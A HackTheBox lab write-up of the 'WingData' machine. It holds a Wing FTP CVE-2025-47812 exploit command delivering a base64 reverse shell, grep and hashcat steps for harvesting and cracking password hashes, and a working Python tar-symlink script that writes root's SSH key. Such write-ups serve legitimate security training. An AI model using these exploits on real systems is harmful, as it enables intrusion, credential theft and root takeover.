---
title: "WingData — HackTheBox Writeup"
date: "2026-02-26"
description: "Medium Linux machine involving Wing FTP CVE-2025-47812 (NULL byte Lua injection RCE), SHA256 hash cracking, and Python tarfile symlink traversal for root SSH key write"
tags: ['hackthebox', 'writeup', 'linux', 'CVE', 'ftp', 'hash cracking', 'symlink attack']
thumbnail: ""
---

# WingData — HTB Labs Machine Writeup

**Difficulty:** Medium
**OS:** Linux (Debian 12)

---

## Attack Chain Summary

```
Nmap Recon → VHost Discovery (ftp.wingdata.htb)
    → CVE-2025-47812 (Wing FTP NULL byte Lua injection → RCE as wingftp)
        → Credential Harvest (SHA256 hashes from Wing FTP user configs)
            → Hashcat Crack → su to wacky → User Flag
                → sudo tar extract script (filter="data") → Symlink Attack
                    → Write authorized_keys to /root/.ssh/ → Root
```

---

## Phase 1: Reconnaissance

### Port Scan

```bash
nmap -sC -sV -Pn --top-ports 1000 10.129.5.145
```

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.2p1 Debian |
| 80 | HTTP | Apache 2.4.66 → wingdata.htb |

### VHost Discovery

The main site had a "Client Portal" link pointing to `ftp.wingdata.htb` — a **Wing FTP Server (Free Edition)** web login interface.

---

## Phase 2: Initial Access — CVE-2025-47812

### Vulnerability

Wing FTP Server 7.4.3 is vulnerable to **CVE-2025-47812** — Unauthenticated RCE via NULL byte Lua injection.

**Root cause**: The `username` parameter is improperly handled during login:
1. `c_CheckUser()` truncates at NULL byte, validating as "anonymous"
2. Session creation uses the full unsanitized username (including Lua code after NULL byte)
3. The malicious session file is written to disk with embedded Lua code
4. When authenticated functionality is accessed, the session file executes as Lua — RCE

### Exploitation

```bash
python3 52347.py -u http://ftp.wingdata.htb/ \
  -c "echo <BASE64_REVSHELL> | base64 -d | bash" \
  -U anonymous
```

Shell received as `wingftp` (uid=1000).

**Note**: The exploit was fragile — Wing FTP accumulated session files from each run, becoming unresponsive after ~6 uses. Machine reset required.

---

## Phase 3: Lateral Movement — wingftp to wacky

### Credential Harvesting

Wing FTP stores user configurations in XML files at `/opt/wftpserver/Data/1/users/`:

```bash
grep -h Password /opt/wftpserver/Data/1/users/*.xml
```

Hashes are SHA256 with salt `WingFTP`. Cracked with hashcat mode 1410:

```bash
hashcat -m 1410 wingftp-hashes.txt /usr/share/wordlists/rockyou.txt
```

Credentials recovered for `wacky`: `<redacted>`

### User Flag

```bash
su wacky
cat /home/wacky/user.txt
```

SSH login was disabled for wacky (`PasswordAuthentication` off) — `su` from the reverse shell was the only lateral movement path.

---

## Phase 4: Privilege Escalation — Tar Symlink Traversal

### sudo Enumeration

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script extracts tar archives **as root** using `tarfile.extractall(path=staging_dir, filter="data")`.

### Key Observations

| Item | Detail |
|------|--------|
| Backups directory | Writable by wacky |
| Extraction runs as | root (via sudo) |
| Python `filter="data"` | Blocks absolute paths and `../`, but **symlinks are processed** |
| Staging directory depth | 4 levels from root |

### Attack: Symlink Traversal via Deep Directory Chain

Python's `filter="data"` can be bypassed using a deep directory chain with symlinks:

```python
#!/usr/bin/env python3
import tarfile, io

pubkey = open('/tmp/tarcraft/key.pub').read().encode()
STAGING_DEPTH = 4
DIR_DEPTH = 20

tar = tarfile.open('/opt/backup_clients/backups/backup_1.tar', 'w')

# Deep directory chain
deep = '/'.join(['d'] * DIR_DEPTH)
d = tarfile.TarInfo(name=deep)
d.type = tarfile.DIRTYPE
d.mode = 0o755
tar.addfile(d)

# Symlink traversing up to / then down to root/.ssh
ups = '../' * (DIR_DEPTH + STAGING_DEPTH)
link = tarfile.TarInfo(name=deep + '/rootssh')
link.type = tarfile.SYMTYPE
link.linkname = ups + 'root/.ssh'
tar.addfile(link)

# authorized_keys via symlink
f = tarfile.TarInfo(name=deep + '/rootssh/authorized_keys')
f.size = len(pubkey)
f.mode = 0o600
tar.addfile(f, io.BytesIO(pubkey))

tar.close()
```

### Exploitation

```bash
ssh-keygen -t ed25519 -f /tmp/tarcraft/key -N ""
python3 /tmp/tarcraft/privesc.py

sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_1.tar -r restore_pwned

ssh -i /tmp/tarcraft/key root@localhost
```

Root shell obtained.

---

## Failed Attempts

| Attempt | Why It Failed | Lesson |
|---------|---------------|--------|
| Repeated CVE-2025-47812 runs | Wing FTP accumulates Lua session files, becomes unresponsive | Minimize exploit attempts; get shell on first use |
| SSH as wacky | PasswordAuthentication disabled | Always try `su` from existing shell |
| Kill wftpserver for admin panel | Shell dies (child process) | Don't kill parent process of your shell |

---

## Key Takeaways

1. **Wing FTP Server <= 7.4.3 has critical unauthenticated RCE** — NULL byte causes mismatch between auth validation and session file creation, resulting in Lua code injection.

2. **`tarfile.extractall(filter="data")` is NOT foolproof** — Deep directory chains + symlinks bypass the filter for arbitrary file write as root.

3. **Fragile exploits should be used sparingly** — Get a reverse shell on the first successful run rather than running individual commands.

---

## Tools Used

- `nmap` — Port scanning
- `ffuf` — VHost discovery
- `52347.py` (searchsploit) — CVE-2025-47812 exploit
- `hashcat -m 1410` — SHA256($pass.$salt) cracking
- `python3` (tarfile) — Malicious tar archive crafting
- `ssh-keygen` — SSH key pair generation
